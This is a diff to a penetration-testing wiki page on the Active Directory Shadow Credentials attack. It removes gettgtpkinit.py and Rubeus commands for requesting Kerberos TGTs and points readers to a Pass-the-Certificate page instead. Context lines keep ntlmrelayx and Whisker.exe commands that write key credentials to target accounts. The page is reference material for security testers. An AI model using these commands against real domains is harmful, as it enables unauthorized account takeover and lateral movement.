@@ -41,13 +41,7 @@ ntlmrelayx -t ldap://dc02 --shadow-credentials --shadow-target 'dc01$'
 ```
 {% endhint %}
 
-When the public key has been set in the `msDs-KeyCredentialLink` of the target, we can use [Dirk-jan](https://twitter.com/\_dirkjan)'s [gettgtpkinit.py](https://github.com/dirkjanm/PKINITtools/blob/master/gettgtpkinit.py) from [PKINITtools](https://github.com/dirkjanm/PKINITtools/) tool to request a TGT (Ticket Granting Ticket) for the target object.
-
-```python
-gettgtpkinit.py -cert-pfx "PATH_TO_CERTIFICATE" -pfx-pass "CERTIFICATE_PASSWORD" "FQDN_DOMAIN/TARGET_SAMNAME" "TGT_CCACHE_FILE"
-```
-
-The ticket obtained can then be used to authenticate with [pass-the-cache](ptc.md) or an [UnPAC-the-hash](unpac-the-hash.md) attack can be conducted.
+When the public key has been set in the `msDs-KeyCredentialLink` of the target, the certificate generated can be used with [Pass-the-Certificate](pass-the-certificate.md) to obtain a TGT and further access.
 {% endtab %}
 
 {% tab title="Windows" %}
@@ -57,13 +51,7 @@ From Windows systems, the `msDs-KeyCredentialLink` attribute of a target user or
 Whisker.exe add /target:"TARGET_SAMNAME" /domain:"FQDN_DOMAIN" /dc:"DOMAIN_CONTROLLER" /path:"cert.pfx" /password:"pfx-password"
 ```
 
-When the public key has been set in the `msDs-KeyCredentialLink` of the target, [Rubeus](https://github.com/GhostPack/Rubeus) can be used to request a TGT (Ticket Granting Ticket) for the target object.
-
-```bash
-Rubeus.exe asktgt /user:"TARGET_SAMNAME" /certificate:"BASE64_CERTIFICATE" /password:"CERTIFICATE_PASSWORD" /domain:"FQDN_DOMAIN" /dc:"DOMAIN_CONTROLLER" /show
-```
-
-That ticket will then be usable with [pass-the-ticket](ptt.md) to authenticate.
+When the public key has been set in the msDs-KeyCredentialLink of the target, the certificate generated can be used with [Pass-the-Certificate](pass-the-certificate.md) to obtain a TGT and further access.
 {% endtab %}
 {% endtabs %}
 
